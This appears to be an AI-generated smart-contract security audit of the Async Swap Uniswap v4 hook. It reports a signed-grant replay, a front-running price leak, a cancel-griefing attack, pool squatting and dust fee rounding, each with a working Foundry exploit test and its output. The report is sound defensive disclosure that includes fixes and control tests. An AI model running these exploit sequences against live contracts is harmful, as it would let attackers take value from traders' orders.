# Security Review — Async Swap

Generated with the [`security-review`][security-review] skill from the Solidity Language Server plugin in
[asyncswap/skills][skills-repo] (pinned to `2e9aca6`). It orchestrates three agents:
[`call-analysis`][call-analysis], [`entrypoint-analysis`][entrypoint-analysis] and
[`poc-generator`][poc-generator]. Findings are judged with the plugin's [judging gates][judging] and laid out with
its [report format][report-formatting].

[skills-repo]: https://github.com/asyncswap/skills
[security-review]: https://github.com/asyncswap/skills/tree/2e9aca64980e7c567dc2045376fb3396d9dfc24b/plugins/solidity-language-server/skills/security-review
[call-analysis]: https://github.com/asyncswap/skills/tree/2e9aca64980e7c567dc2045376fb3396d9dfc24b/plugins/solidity-language-server/skills/call-analysis
[entrypoint-analysis]: https://github.com/asyncswap/skills/tree/2e9aca64980e7c567dc2045376fb3396d9dfc24b/plugins/solidity-language-server/skills/entrypoint-analysis
[poc-generator]: https://github.com/asyncswap/skills/tree/2e9aca64980e7c567dc2045376fb3396d9dfc24b/plugins/solidity-language-server/skills/poc-generator
[judging]: https://github.com/asyncswap/skills/blob/2e9aca64980e7c567dc2045376fb3396d9dfc24b/plugins/solidity-language-server/references/judging.md
[report-formatting]: https://github.com/asyncswap/skills/blob/2e9aca64980e7c567dc2045376fb3396d9dfc24b/plugins/solidity-language-server/references/report-formatting.md

---

## Scope

|                    |                                                        |
| ------------------ | ------------------------------------------------------ |
| **File(s)**        | `AsyncSwap.sol` · `Router.sol` · `FeeVault.sol` · `TokenClaims.sol` · `NativeClaims.sol` · `BaseHook.sol` · libraries `AsyncFiller` · `AsyncMatching` · `DynamicFeeOrdering` · `TickPrice` · `EligiblePrice` · `OrderSignatures` · `CurrencySettler` · `ClaimTransfers` |
| **Commit**         | `81ba6b8` (`src/` unchanged through `6e610de`)         |
| **Solidity**       | 0.8.26                                                 |
| **Inherits**       | `BaseHook` · `EIP712` · `Multicall`                    |
| **Agents**         | [call-analysis][call-analysis] · [entrypoint-analysis][entrypoint-analysis] · [poc-generator][poc-generator] |
| **Date**           | 2026-11-01                                             |

`MatchingEngine.sol` is out of scope: it is a benchmark harness and is not deployed.

---

## Executive Summary

Async Swap is a Uniswap v4 hook that turns swaps into resting limit orders. The scope has 34 state-changing
entry points; about 15 are open to anyone, and pool creation is permissionless. Three findings are proven with
Foundry POCs: two Medium (M-01, M-02) and one Low (L-01). Two more issues have passing POCs but only low or
dust-level impact (L-02, I-01), and eight leads remain for manual review.

No path lets anyone take another order's escrow. The review checked cross-pool and cross-order theft,
hostile-token reentrancy, stale `msg.value` through `multicall`, and transient state leaking between calls.
The most important risk is M-01: a maker's revocation of the Router is not final, because a leftover signed grant
can undo it.

| ID | Severity | Issue | Confidence | POC |
|----|----------|-------|------------|-----|
| [M-01](#m-01-a-leftover-signed-setexecutor-grant-can-undo-a-makers-revocation) | Medium | Leftover signed `SetExecutor` grant undoes a maker's revocation | 75 | CONFIRMED |
| [M-02](#m-02-a-front-run-ask-can-force-a-new-order-onto-the-book-at-a-worse-price-than-the-pool) | Medium | Front-run ask forces a new order onto the book at a worse price than the pool | 60 | PARTIALLY CONFIRMED |
| [L-01](#l-01-a-small-partial-match-voids-a-makers-relayed-cancel-or-reprice) | Low | Small partial match voids a maker's relayed cancel or reprice | 65 | CONFIRMED |
| [L-02](#l-02-pool-squatting-disables-the-asset-floor) | Low | Pool squatting disables the asset floor | — | CONFIRMED, dust impact |
| [I-01](#i-01-fee-rounding-on-dust-remainders) | Informational | Fee rounding on dust remainders | — | Only with minimums off |

---

## Findings

### M-01: A leftover signed `SetExecutor` grant can undo a maker's revocation

`Router.swapWithSig` · Line 188 · Confidence: 75 · Severity: Medium

**Description**
`swapWithSig` applies a grant, and spends its nonce, only when the Router is not yet an executor. Otherwise the
grant is skipped and stays valid until its deadline. After the maker revokes the Router, anyone can replay the
grant from the public transaction data to re-authorize it and fill the maker's stale order. The fix is to always
spend a supplied grant's nonce, or to reject a grant when the Router is already authorized. Until then, a maker
can protect themselves with `invalidateNonce`.

**Attack Path**
```
maker already authorized Router → relayer: swapWithSig(order, permit, grant) → grant skipped, nonce 5 still unused
→ maker: setExecutor(Router, false) → attacker: hook.setExecutorWithSig(grant from calldata) → Router authorized again
→ attacker: router.fillOrder(stale order) at the maker's old minimum
```

**Proof of Concept**

[`GrantReplay.t.sol`](../test/security/poc/GrantReplay.t.sol), built on [`PocSignedBase.sol`](../test/security/poc/PocSignedBase.sol). Control: `test_control_consumedGrantCannotBeReplayed` (a consumed grant reverts `NonceAlreadyUsed`). Mitigation: `test_poc_invalidateNonceStopsReplay`.

```solidity
/// Exploit: grant skipped -> maker revokes Router -> third party replays grant -> Router re-authorized -> a filler
/// takes the maker's (now stale-priced) order that the maker meant to freeze by revoking.
function test_poc_skippedGrantReplayedAfterRevocation() public {
    // Maker had already authorized the Router directly (e.g. an earlier order).
    vm.prank(maker);
    hook.setExecutor(poolId, address(router), true);

    Router.ExecutorGrant memory grant = _grant(GRANT_NONCE, block.timestamp + 7 days);
    AsyncOrder memory order = _relaySignedCreate(grant);
    assertFalse(hook.nonceUsed(maker, GRANT_NONCE), "grant was skipped: nonce still live");
    emit log_named_uint("grant nonce used after swapWithSig (0=false)", hook.nonceUsed(maker, GRANT_NONCE) ? 1 : 0);

    // Maker revokes the Router (e.g. to stop fillOrder against an order whose price is now stale).
    vm.prank(maker);
    hook.setExecutor(poolId, address(router), false);
    assertFalse(hook.isExecutor(poolId, maker, address(router)));

    // While revoked, fillOrder is blocked.
    vm.prank(attacker);
    vm.expectRevert(AsyncFiller.NotAuthorizedExecutor.selector);
    router.fillOrder(order, type(uint256).max, "");

    // Anyone replays the leftover grant (it is in public calldata of the swapWithSig tx).
    vm.warp(block.timestamp + 1 days);
    vm.prank(attacker);
    hook.setExecutorWithSig(key, maker, address(router), true, grant.nonce, grant.deadline, grant.signature);
    assertTrue(hook.isExecutor(poolId, maker, address(router)), "Router re-authorized against maker's revocation");

    // The attacker now fills the maker's stale order at its old limit.
    uint256 atk0Before = token0.balanceOf(attacker);
    uint256 atk1Before = token1.balanceOf(attacker);
    uint256 maker1Before = token1.balanceOf(maker);
    vm.prank(attacker);
    router.fillOrder(order, type(uint256).max, "");
    uint256 gotIn = token0.balanceOf(attacker) - atk0Before;
    uint256 paidOut = atk1Before - token1.balanceOf(attacker);
    emit log_named_uint("attacker token0 received", gotIn);
    emit log_named_uint("attacker token1 paid", paidOut);
    emit log_named_uint("maker token1 received", token1.balanceOf(maker) - maker1Before);
    (uint256 live,) = hook.asyncOrderInfo(poolId, _id(order));
    assertEq(live, 0, "order filled after the maker revoked the Router");
    assertEq(paidOut, AMOUNT_OUT_MIN);
    // If the market moved to 1.2 token1/token0, the maker's 1 token0 (worth 1.2) sold for 0.95: >20% below value.
    uint256 fairValue = 1.2 ether;
    assertLt(token1.balanceOf(maker) - maker1Before, fairValue * 80 / 100, "maker got <80% of market value");
}
```

```text
Ran 1 test for test/security/poc/GrantReplay.t.sol:GrantReplayPoc
[PASS] test_poc_skippedGrantReplayedAfterRevocation() (gas: 1549556)
Logs:
  grant nonce used after swapWithSig (0=false): 0
  attacker token0 received: 999800000000000000
  attacker token1 paid: 950000000000000000
  maker token1 received: 949810000000000000
```

---

### M-02: A front-run ask can force a new order onto the book at a worse price than the pool

`AsyncSwap.matchNewOrder` → `AsyncMatching._swapAgainstPool` · Line 450 · Confidence: 60 · Severity: Medium

**Description**
When the pool beats the book, the hook tries to fill the new order from the pool, capped at the best book price,
and requires the whole order to fill. Otherwise the attempt reverts and the order goes to the book. An attacker
who can front-run posts an ask between the pool's average fill price and its end price, so the pool attempt
fails and the maker matches the attacker's ask: worse than the pool, but within the maker's limit. This is value
leakage from the maker, not theft, and it requires mempool ordering.

**Attack Path**
```
attacker sees Alice's 1000-token1 buy → front-runs with an ask at 1.0018, inside the buy's pool path
→ pool-first attempt is capped at that ask and reverts as a partial fill → Alice's buy matches the ask
→ attacker cancels the rest of the ask and buys back from the pool with the token1 earned
```

**Proof of Concept**

[`PoolFirstFrontRun.t.sol`](../test/security/poc/PoolFirstFrontRun.t.sol), built on [`SetupHook.t.sol`](../test/SetupHook.t.sol). Control: `test_control_buyFillsFromPool` (without the front-run, the buy fills entirely from the pool).

```solidity
function test_poc_frontRunAskForcesWorseBookMatch() public {
    // Reference: what the pool alone would have given (snapshot/revert).
    uint256 snap = vm.snapshotState();
    uint256 poolOnly = _aliceBuy();
    vm.revertToState(snap);

    // Attacker front-runs with an ask at 1.0018, inside the buy's pool path (pool would end ~1.002).
    AsyncOrder memory ask = _order(attacker, true, ASK_IN, ASK_IN * ASK_PRICE_BPS / 10_000);
    uint256 atk0Before = _bal0(attacker);
    uint256 atk1Before = _bal1(attacker);
    _submit(ask);
    assertEq(hook.asyncOrder(poolId, _orderIdFor(attacker, true, ask.salt)), ASK_IN, "ask rests (pool below it)");

    uint256 got = _aliceBuy();
    emit log_named_uint("pool-only: alice token0 received", poolOnly);
    emit log_named_uint("attacked: alice token0 received", got);
    emit log_named_uint("alice shortfall token0", poolOnly - got);
    emit log_named_uint("alice shortfall bps x100", (poolOnly - got) * 1_000_000 / poolOnly);
    assertLt(got, poolOnly, "maker received less than pool-only execution");

    // Attacker closes: cancel the ask remainder, then buy back token0 through the pool with the token1 earned.
    vm.prank(attacker);
    router.cancelOrder(_order(attacker, true, ASK_IN, ASK_IN * ASK_PRICE_BPS / 10_000));
    uint256 earned1 = _bal1(attacker) - atk1Before;
    uint256 sold0 = atk0Before - _bal0(attacker);
    emit log_named_uint("attacker token0 sold", sold0);
    emit log_named_uint("attacker token1 earned", earned1);
    _submit(_order(attacker, false, earned1, 1));
    int256 pnl0 = int256(_bal0(attacker)) - int256(atk0Before);
    int256 pnl1 = int256(_bal1(attacker)) - int256(atk1Before);
    emit log_named_int("attacker net token0 after buyback", pnl0);
    emit log_named_int("attacker net token1 after buyback", pnl1);
}
```

```text
Ran 1 test for test/security/poc/PoolFirstFrontRun.t.sol:PoolFirstFrontRunPoc
[PASS] test_poc_frontRunAskForcesWorseBookMatch() (gas: 3309785)
Logs:
  pool-only: alice token0 received: 998701617972538820581
  attacked: alice token0 received: 998003593531643042523
  alice shortfall token0: 698024440895778058
  alice shortfall bps x100: 698
  attacker token0 sold: 998203234178478738271
  attacker token1 earned: 999800000000000000000
  attacker net token0 after buyback: 298842911593562305
  attacker net token1 after buyback: 0
```

---

### L-01: A small partial match voids a maker's relayed cancel or reprice

`Router.cancelWithSig` / `AsyncSwap.updatePriceWithSig` · Lines 206 / 676 · Confidence: 65 · Severity: Low

**Description**
Signed cancels and reprices commit to the order's live `amountIn`. One small crossing match before the relayer
submits makes the signature invalid, so the order stays live at its old price until the maker signs again. In
production the attacker must trade at least the $10 minimum at the maker's own price each time, and could simply
fill the order outright instead.

**Attack Path**
```
maker signs CancelOrder(amountIn = 1e18) → attacker places a small crossing bid (0.0095 token1 in the POC)
→ order partially matches, amountIn becomes 0.99e18 → relayer: cancelWithSig → InvalidSignature, nonce not spent
→ 99% of the order stays fillable at the old minimum
```

**Proof of Concept**

[`SignedCancelGrief.t.sol`](../test/security/poc/SignedCancelGrief.t.sol), built on [`PocSignedBase.sol`](../test/security/poc/PocSignedBase.sol). The reprice variant is `test_poc_dustMatchBreaksRelayedReprice`. Control: `test_control_cancelSucceedsWithoutInterference`.

```solidity
function test_poc_dustMatchBreaksRelayedCancel() public {
    AsyncOrder memory order = _createSigned();
    uint256 deadline = block.timestamp + 1 hours;
    bytes memory sig = _cancelSig(order, AMOUNT_IN, CANCEL_NONCE, deadline);

    (uint256 paid, uint256 got) = _dustMatch();
    (uint256 liveIn, uint256 liveMin) = hook.asyncOrderInfo(poolId, _id(order));
    emit log_named_uint("attacker quote paid (token1)", paid);
    emit log_named_uint("attacker asset received (token0, net of fee)", got);
    emit log_named_uint("attacker cost vs fair value at maker price", paid - got * AMOUNT_OUT_MIN / AMOUNT_IN);
    emit log_named_uint("maker order remaining amountIn", liveIn);
    emit log_named_uint("maker order remaining min out", liveMin);
    assertEq(liveIn, AMOUNT_IN - DUST_ASSET, "dust partially matched");

    vm.prank(relayer);
    vm.expectRevert(Router.InvalidSignature.selector);
    router.cancelWithSig(order, CANCEL_NONCE, deadline, sig);
    assertFalse(hook.nonceUsed(maker, CANCEL_NONCE), "nonce not burnt; tx reverted");

    // Remainder stays exposed at the stale price; e.g. a filler takes it all.
    order.amountIn = liveIn;
    uint256 b0 = token0.balanceOf(bob);
    vm.prank(bob);
    router.fillOrder(order, type(uint256).max, "");
    emit log_named_uint("remainder taken by filler after failed cancel (token0)", token0.balanceOf(bob) - b0);
    // Exposure: >= 99% of the order the maker tried to cancel remained fillable; attacker spent <1%.
    assertGe(liveIn, AMOUNT_IN * 99 / 100);
    assertLt(paid, AMOUNT_IN * 1 / 100);
}
```

```text
Ran 1 test for test/security/poc/SignedCancelGrief.t.sol:SignedCancelGriefPoc
[PASS] test_poc_dustMatchBreaksRelayedCancel() (gas: 2225597)
Logs:
  attacker quote paid (token1): 9500000000000000
  attacker asset received (token0, net of fee): 9998000000000000
  attacker cost vs fair value at maker price: 1900000000000
  maker order remaining amountIn: 990000000000000000
  maker order remaining min out: 940500000000000000
  remainder taken by filler after failed cancel (token0): 989802000000000000

Ran 1 test for test/security/poc/SignedCancelGrief.t.sol:SignedCancelGriefPoc
[PASS] test_poc_dustMatchBreaksRelayedReprice() (gas: 1900010)
Logs:
  min out after failed reprice: 940500000000000000
```

---

## Findings List

| ID | Confidence | Title | Entrypoint | POC |
|---|---|---|---|---|
| M-01 | [75] | Leftover signed grant undoes revocation | `swapWithSig()` / `setExecutorWithSig()` | CONFIRMED: [`GrantReplay.t.sol`](../test/security/poc/GrantReplay.t.sol) `test_poc_skippedGrantReplayedAfterRevocation` passes. The order is filled after revocation; at a market price of 1.2 the maker gets under 80% of fair value. |
| M-02 | [60] | Front-run ask forces a worse book match | `swap()` → `matchNewOrder()` | PARTIALLY CONFIRMED: [`PoolFirstFrontRun.t.sol`](../test/security/poc/PoolFirstFrontRun.t.sol) `test_poc_frontRunAskForcesWorseBookMatch` passes. The maker gets 998.0036 instead of 998.7016 token0 (−6.98 bps); the attacker nets +0.2988 token0 (about 3 bps) after fees. |
| L-01 | [65] | Small match voids a relayed cancel or reprice | `cancelWithSig()` / `updatePriceWithSig()` | CONFIRMED: [`SignedCancelGrief.t.sol`](../test/security/poc/SignedCancelGrief.t.sol) `test_poc_dustMatchBreaksRelayedCancel` and `test_poc_dustMatchBreaksRelayedReprice` pass. 99% stays exposed for under 1% of notional. |

Each finding has a passing control test, for example `test_control_consumedGrantCannotBeReplayed` (the replay
reverts with `NonceAlreadyUsed`) and `test_control_buyFillsFromPool`. `test_poc_invalidateNonceStopsReplay` shows
the maker-side mitigation for M-01. Run them all with:

```bash
forge test --match-path "test/security/poc/*.t.sol" -vv
```

---

## Low-impact and informational issues

These have passing POCs, but the judging gates demote them for impact, so they carry no confidence score.

### L-02: Pool squatting disables the asset floor

`AsyncSwap._minAssetAmount` · Severity: Low

Calling `decimals()` on an address with no code succeeds and returns nothing, which gives a 1-unit floor. A pool
initialized at a token's predicted address before the token is deployed keeps that floor forever and accepts
1-wei sells, a floor 1e14 times lower ([`PoolSquatAssetFloor.t.sol`](../test/security/poc/PoolSquatAssetFloor.t.sol)).
The impact is dust: the USDC minimum still applies, and the same token with another tick spacing gets a fresh
pool with the right floor. Fix: require `asset.code.length > 0` in `_minAssetAmount`.

**Proof of Concept**

[`PoolSquatAssetFloor.t.sol`](../test/security/poc/PoolSquatAssetFloor.t.sol), built on [`SetupHook.t.sol`](../test/SetupHook.t.sol). Control: `test_control_poolAfterDeployHasFloor` (floor 1e14; a 1-wei sell reverts).

```solidity
function test_poc_squattedPoolHasOneWeiFloor() public {
    address predicted = vm.computeCreateAddress(tokenDeployer, vm.getNonce(tokenDeployer));
    assertEq(predicted.code.length, 0);
    PoolKey memory squat = _keyFor(predicted, 1);

    // Squatter opens the canonical pool before the token exists, at an arbitrary extreme price.
    vm.prank(squatter);
    manager.initialize(squat, TickMath.MAX_SQRT_PRICE - 1);
    emit log_named_uint("squatted pool asset floor", hook.minAssetAmount(squat.toId()));
    assertEq(hook.minAssetAmount(squat.toId()), 1, "floor fixed at 1 wei");

    // Token launches at the predicted address (18 decimals).
    vm.prank(tokenDeployer);
    MockERC20 asset = new MockERC20("Launch", "LNCH", 18);
    assertEq(address(asset), predicted);
    asset.mint(alice, 1 ether);

    // 1-wei sell (asking the $10 minimum) is accepted on the squatted pool despite precision 4.
    uint256 stored = _sell(squat, address(asset), 1, 10e6);
    emit log_named_uint("1-wei sell stored on squatted pool", stored);
    assertEq(stored, 1);
    assertLt(stored, 1e14 * 80 / 100, "below the intended 1e14 floor");

    // Mitigation available: a fresh key (tickSpacing 2) for the same token gets the proper floor.
    PoolKey memory fresh = _keyFor(address(asset), 2);
    manager.initialize(fresh, 2 ** 96);
    emit log_named_uint("fresh pool (spacing 2) floor", hook.minAssetAmount(fresh.toId()));
    assertEq(hook.minAssetAmount(fresh.toId()), 1e14);
}
```

```text
Ran 1 test for test/security/poc/PoolSquatAssetFloor.t.sol:PoolSquatAssetFloorPoc
[PASS] test_poc_squattedPoolHasOneWeiFloor() (gas: 1847418)
Logs:
  squatted pool asset floor: 1
  1-wei sell stored on squatted pool: 1
  fresh pool (spacing 2) floor: 100000000000000
```

### I-01: Fee rounding on dust remainders

`AsyncMatching._settleTransfers` · Severity: Informational

The 0.02% fee rounds up, and the asset floor is not re-checked on partial-match remainders. With no minimum, a
buyer can pay 1000 base units and receive 0 asset ([`DustTradeFee.t.sol`](../test/security/poc/DustTradeFee.t.sol)).
The production-settings test shows it cannot happen with a $10 minimum and precision 4.

**Proof of Concept**

[`DustTradeFee.t.sol`](../test/security/poc/DustTradeFee.t.sol), built on [`SetupHook.t.sol`](../test/SetupHook.t.sol). Runs with the minimums off. `test_poc_dustOrdersRejectedUnderProductionKnobs` shows the same orders revert with a $10 minimum and precision 4.

```solidity
function test_poc_buyerPaysQuoteReceivesZeroAsset() public {
    // Seller: 1 wei asset for >= 1000 quote. Buyer: 1000 quote for >= 1 wei asset.
    (uint256 paid, uint256 got, uint256 sellerGot) = _match(1, 1000, 1000, 1);
    assertEq(paid, 1000, "buyer paid full quote");
    assertEq(got, 0, "ceil fee took the whole 1-wei asset leg");
    assertEq(sellerGot, 999);
    assertLt(got, uint256(1) * 80 / 100 + 1, "buyer got <80% of 1 wei (0)");
}
```

```text
Ran 1 test for test/security/poc/DustTradeFee.t.sol:DustTradeFeeNoMinimumPoc
[PASS] test_poc_buyerPaysQuoteReceivesZeroAsset() (gas: 1577323)
Logs:
  buyer quote paid: 1000
  buyer asset received: 0
  seller quote received: 999

Ran 1 test for test/security/poc/DustTradeFee.t.sol:DustTradeFeeProductionPoc
[PASS] test_poc_dustOrdersRejectedUnderProductionKnobs() (gas: 257606)
```

---

## Leads

_Code smells where the full exploit path could not be completed. Not scored._

- **ERC-20 fills trust that the executor already paid** — `AsyncSwap.executeOrder` — Code smells: `AsyncFiller.fill`
  takes the maker's output from the hook's balance without tying it to this executor's payment. Safe today only
  because the hook never holds a spare balance while untrusted code runs.
- **Hostile token runs code in the middle of a fill** — `Router.unlockCallback` (FillOrder) — Code smells: a token's
  `transferFrom` runs while the PoolManager is unlocked; the "order changed during fill" check re-checks only the
  target order. No misuse found.
- **Relayer gas griefing of the pool-first attempt** — `AsyncSwap.matchNewOrder` — Code smells: `try … catch {}` also
  swallows out-of-gas. Needs the pool fill to cost far more gas than the rest of the call; feasibility unverified.
- **Shared native deposit ledger** — `AsyncSwap.receive` — Code smells: ETH sent to the hook counts for the whole
  transaction, from any sender. No path routes ETH to the hook today; a contract bundling several users' fills
  into one transaction is unverified.
- **`matchNewOrder` does not bind the order to the pending ID** — `AsyncSwap.matchNewOrder:430` — Code smells: uses
  `order.key` and `order.zeroForOne` from calldata without checking `orderId() == id`. Only the Router can call
  it, so this is defence in depth.
- **Oversized return data from `decimals()`** — `AsyncSwap._beforeInitialize` — Code smells: the raw `staticcall`
  copies all returned data. Only the pool creator's own transaction pays.
- **Just-in-time LPs capture the dynamic fee** — `DynamicFeeOrdering.charge` — Code smells: half the fee is donated
  to whoever is in range at fill time, so an LP can add a narrow position just before a visible backrun fill.
  Economic leakage only.
- **2-block window is easy to wait out on fast chains** — `DynamicFeeOrdering.charge` — Code smells:
  `ORDERING_WINDOW = 2` blocks. On MegaETH or HyperEVM, waiting 3 blocks avoids the fee; not quantified.

Already known and documented, so not re-reported: revoking the Router strands an EOA maker's orders
([`ExecutorRevocation.t.sol`](../test/security/ExecutorRevocation.t.sol)), the 0.0001-token asset floor, and the
owner's `sweep` of the hook's raw balance.

---

## Entrypoint Surface

| Function | Line | Access | Payable | Parameters | Risk |
|---|---|---|---|---|---|
| `Router.swap()` | 117 | caller must be `order.owner` | yes | order, userData | Medium (M-02) |
| `Router.swapWithSig()` | 185 | Permit2 witness signature + optional grant | no | order, permit, grant | Medium (M-01) |
| `Router.fillOrder()` | 153 | permissionless | yes | order, maxPrice | Lead |
| `Router.cancelWithSig()` | 206 | EIP-712 signature + nonce | no | order, nonce, deadline, sig | Low (L-01) |
| `Router.cancelOrder()` / `cancelAndWithdraw()` | 229 / 240 | caller must be the owner | no | order | — |
| `Router.withdrawClaims()` | 249 | caller's own claims | no | currencies, amounts | — |
| `Router.matchBook()` / `fillFromPoolLiquidity()` | 263 / 273 | permissionless | no | key, maxMatches / order | — |
| `Router.multicall()` | inherited | permissionless, runs each call as the caller | no | bytes[] | — |
| `AsyncSwap.updatePriceWithSig()` | 676 | EIP-712 signature (binds amountIn, sequence) | no | order, newMin, nonce, deadline, sig | Low (L-01) |
| `AsyncSwap.setExecutorWithSig()` | 654 | EIP-712 signature + nonce | no | key, maker, executor, allow, … | Medium (M-01) |
| `AsyncSwap.updatePrice()` / `setExecutor()` / `invalidateNonce()` | 531 / 647 / 703 | caller's own state | no | — | — |
| `AsyncSwap.matchBook()` | 518 | permissionless, inside an unlock | no | key, maxMatches | — |
| `PoolManager.initialize` → `_beforeInitialize()` | 248 | permissionless (needs a USDC leg and the dynamic fee) | no | key, sqrtPrice | Low (L-02) |
| `AsyncSwap.receive()` | 746 | permissionless | yes | — | Lead |
| `TokenClaims.redeem()` / `NativeClaims.redeem()` | 30 | caller's own claims, `nonReentrant` | no | (currency,) recipient, amount | — |

---

## External Call Surface

| Call | Depth | Parent | Target Type | Checked | Risk |
|---|---|---|---|---|---|
| `IERC20(input).safeTransferFrom` | 3 | `swap` → `CurrencySettler.settle` | [external-untrusted] asset | SafeERC20 + PoolManager balance diff; pending-order guard | MED |
| `IERC20(output).safeTransferFrom` | 3 | `fillOrder` callback | [external-untrusted] | `_requireUnchanged` afterwards | MED |
| `PM.take(ERC20 → maker/filler)` | 4 | `fill` / `cancel` / `fillFromPool` | [external-untrusted] token + recipient | order deleted first | MED |
| `asset.staticcall(decimals())` | 2 | `_beforeInitialize` | [external-untrusted] | ok and ≥ 32 bytes; capped at 36 | LOW (L-02) |
| `PERMIT2.permitWitnessTransferFrom` | 3 | `_settleWithPermit` | [external-dep] | witness = `hashOrder` | LOW |
| `this.fillOrderFromPoolLiquidity` | 3 | `matchNewOrder` / `tryFill` | self-call | `NotSelf`; try/catch | LOW (lead) |
| `HOOK.call{value}` | 1 | `fillOrder` (native output) | trusted hook | `msg.value == live price` | LOW |
| `SignatureChecker.isValidSignatureNow` | 2 | `_verify`, `cancelWithSig` | [external-untrusted] ERC-1271 view | — | LOW |
| `delegatecall(self)` | 1 | `Router.multicall` | inherited OpenZeppelin | not payable | LOW |

---

> This review was performed by an AI assistant using LSP-augmented analysis (call hierarchy, symbol resolution,
> taint tracking). AI analysis cannot verify the complete absence of vulnerabilities. Team security reviews, bug
> bounty programs, and on-chain monitoring are strongly recommended.
